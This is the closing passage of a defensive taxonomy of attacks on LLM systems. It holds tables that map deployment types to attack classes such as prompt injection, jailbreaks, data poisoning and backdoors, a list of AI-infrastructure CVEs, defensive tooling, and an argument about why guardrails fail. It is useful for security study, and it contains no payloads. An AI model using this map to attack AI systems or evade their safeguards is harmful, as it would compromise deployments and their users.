| **Pre-Training Compromise** | Web-scraped corpus, data pipelines | §4-1 (Corpus poisoning), §4-3 (Backdoor injection) |
| **Fine-Tuning Compromise** | API-based or open-source fine-tuning | §2-4 (Alignment removal), §4-2 (Fine-tuning poisoning) |
| **Inference-Time Attack** | User-facing chatbot or API | §1 (Prompt injection), §2 (Jailbreak), §3 (Prompt leakage), §11 (DoS) |
| **RAG Pipeline Attack** | Document retrieval + LLM generation | §5 (RAG attacks), §1-2 (Indirect injection), §10-2 (Data leakage) |
| **Agent/Tool-Use Attack** | Autonomous agent with MCP/tools | §6 (Agent exploitation), §1-2 (Indirect injection), §7 (Output handling) |
| **Supply Chain Attack** | Model hub → developer → deployment | §8-2 (Supply chain), §4-3 (Backdoor), §7-3 (Slopsquatting) |
| **Multimodal Pipeline Attack** | Vision/Audio + Language model | §9 (Multimodal attacks), §1-3 (Encoding bypass) |
| **Output Consumption Attack** | LLM output → browser/DB/API | §7 (Output handling), §7-3 (Hallucination exploits) |
| **Privacy Breach** | Any deployment with sensitive data | §10 (Privacy attacks), §3 (Prompt leakage), §8-3 (Model theft) |

---

## CVE / Bounty Mapping (2024–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---------------------|-----------|----------------|
| §8-1 (Pickle deserialization) | CVE-2024-50050 (Meta Llama Stack) | RCE via pickle over ZeroMQ. Patched to JSON-based serialization |
| §8-1 (Pickle deserialization) | CVE-2025-30165 (vLLM) | RCE via ShadowMQ pattern — code copied from Meta Llama Stack |
| §8-1 (Pickle deserialization) | CVE-2025-23254 (NVIDIA TensorRT-LLM) | RCE via same ShadowMQ pattern propagated via code reuse |
| §8-1 (Tensor deserialization) | CVE-2025-62164 (vLLM) | RCE via `torch.load()` on Base64-encoded user embeddings |
| §8-2 (Serialization injection) | CVE-2025-68664 (LangChain Core) | CVSS 9.3. Secret extraction via reserved 'lc' serialization markers |
| §8-2 (Serialization injection) | CVE-2025-68665 (LangChainJS) | Similar serialization mechanics enabling secret extraction |
| §6-3 (MCP RCE) | CVE-2025-6514 (mcp-remote) | Critical OS command injection via crafted `authorization_endpoint`. 437K+ downloads |
| §6-2 (Agent impersonation) | CVE-2025-12420 (ServiceNow) | Admin impersonation via email-only input to AI agent API |
| §6-3 (Workflow RCE) | CVE-2026-21858 (n8n) | CVSS 10.0. Unauthenticated RCE via AI workflow platform |
| §8-1 (Path traversal) | CVE-2024-39722 (Ollama) | Arbitrary file read via path traversal on model server |
| §8-1 (Auth bypass) | CVE-2025-51471 (Ollama) | Authentication bypass on Ollama inference API |
| §8-1 (DoS) | CVE-2024-39721 (Ollama) | Denial-of-service via crafted requests |
| §8-1 (Container escape) | CVE-2024-0132 (NVIDIA Container Toolkit) | Container escape to host system in AI workloads |
| §8-3 (Model distillation) | DeepSeek → OpenAI (Dec 2024) | Unauthorized API-based distillation of GPT-3/4. API access revoked |
| §5-2 (Cross-tenant) | Asana MCP Server (2025) | Cross-tenant data access in MCP-integrated project management |

---

## Detection and Security Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **NVIDIA garak** (Scanner) | LLM vulnerability assessment — hallucination, prompt injection, jailbreak, data leakage, toxicity | Automated probe generation and response analysis, Metasploit-style plugin architecture |
| **Rebuff** (Defense) | Prompt injection detection and prevention | Multi-layered defense: heuristic filters, LLM-based detection, vector DB attack matching, canary tokens |
| **MITRE ATLAS** (Framework) | AI adversary tactics and techniques knowledge base — 15 tactics, 66 techniques, 46 sub-techniques, 33 case studies | Structured threat intelligence framework aligned with ATT&CK methodology |
| **Lakera Guard** (Defense) | Real-time prompt injection and content safety detection | API-based guardrail with heuristic and ML-based filtering |
| **Picklescan** (Scanner) | Malicious pickle file detection in ML model files | Static analysis of pickle opcodes for dangerous operations (note: evadable — §8-2) |
| **Protect AI Guardian** (Scanner) | Model repository scanning — 4.47M+ model versions scanned, 352K+ issues identified across 51.7K models | Automated model file analysis for embedded threats |
| **DeepTeam** (Framework) | LLM red-teaming framework supporting OWASP Top 10 and MITRE ATLAS evaluations | Automated attack scenario generation and evaluation |
| **Promptfoo** (Testing) | LLM output quality and security testing — prompt injection, jailbreak, harmful content | Configurable eval framework with adversarial test suites |
| **RAGuard** (Defense) | RAG poisoning detection | Expands retrieval scope, applies perplexity filtering and similarity analysis to detect injected documents |
| **MCPGuard** (Scanner) | MCP server vulnerability detection | Automated scanning of MCP tool descriptions and configurations for injection and poisoning risks |
| **SpeechGuard** (Defense) | Audio adversarial input defense for spoken QA systems | Injects lightweight noise into audio signals to disrupt adversarial cues |
| **Aardvark** (Red Team) | OpenAI's agentic security researcher for automated vulnerability discovery | AI-driven autonomous security testing agent |

---

## Summary: Core Principles

**The fundamental property that makes the AI/LLM attack surface possible is the collapse of the instruction-data boundary.** Traditional computing maintains a strict separation between code (instructions) and data — von Neumann architecture notwithstanding, modern systems use privilege rings, sandboxing, and type systems to enforce this boundary. LLMs fundamentally violate this principle: instructions (system prompts) and data (user input, retrieved documents, tool output) exist in the same token stream, processed by the same attention mechanism, with no architectural enforcement of privilege levels. Every attack category in this taxonomy — from prompt injection (§1) through tool poisoning (§6) to output handling (§7) — ultimately exploits this single architectural reality.

**Incremental patches fail because the attack surface grows faster than defenses can cover it.** Each new capability added to LLM systems — tool use, code execution, file access, web browsing, multimodal processing, persistent memory, MCP server integration — introduces multiplicative attack vectors that combine with existing vulnerabilities. Guardrails operating on input text cannot protect against adversarial images (§9), poisoned retrieval documents (§5), or malicious tool descriptions (§6-1). Per-turn safety evaluation cannot defend against multi-turn escalation (§2-2). Content-based filters cannot detect near-constant-sample data poisoning (§4-1) or quantization-phase backdoors (§2-4). The result is a perpetual game of whack-a-mole where each defense creates new evasion opportunities.

**A structural solution requires architectural separation of concerns.** Just as web security evolved from "sanitize everything" to Content Security Policy, CORS, and sandboxed iframes, AI security must move toward architecturally enforced boundaries: cryptographic attestation of instruction provenance (distinguishing system prompts from user input at the token level), capability-based access control for tool use (least-privilege by default, explicit per-action authorization), formal verification of safety properties that survive fine-tuning, and end-to-end integrity verification for the model supply chain from training data through deployment. Until these structural guarantees exist, the taxonomy documented here will continue to expand with each new LLM capability.

---

## References

- OWASP Top 10 for LLM Applications 2025 — https://genai.owasp.org/llm-top-10/
- MITRE ATLAS — Adversarial Threat Landscape for AI Systems — https://atlas.mitre.org/
- NIST AI 100-2e2025 — Adversarial Machine Learning: A Taxonomy and Terminology of Attacks and Mitigations
- NVIDIA garak — LLM Vulnerability Scanner — https://github.com/NVIDIA/garak
- PoisonedRAG — USENIX Security 2025 — Knowledge Corruption Attacks to RAG
- ShadowMQ Vulnerability Pattern — Oligo Security Research, 2025
- MCP Security Notification: Tool Poisoning Attacks — Invariant Labs, April 2025
- CVE-2025-6514 — Critical RCE in mcp-remote — JFrog Security Research
- CVE-2025-68664 — LangGrinch: LangChain Core Serialization Injection — Cyata
- CVE-2025-12420 — ServiceNow Agentic AI Impersonation — AppOmni
- Slopsquatting: AI Hallucination Supply Chain Threat — Multi-university Study, 2025
- LLM Fine-Tuning Safety — 10-example Jailbreak via OpenAI API — GitHub/LLM-Tuning-Safety
- Anthropic — Disrupting AI-Orchestrated Cyber Espionage Campaign, September 2025
- ACL 2024 Tutorial: Vulnerabilities of Large Language Models to Adversarial Attacks

---

*This document was created for defensive security research and vulnerability understanding purposes.*
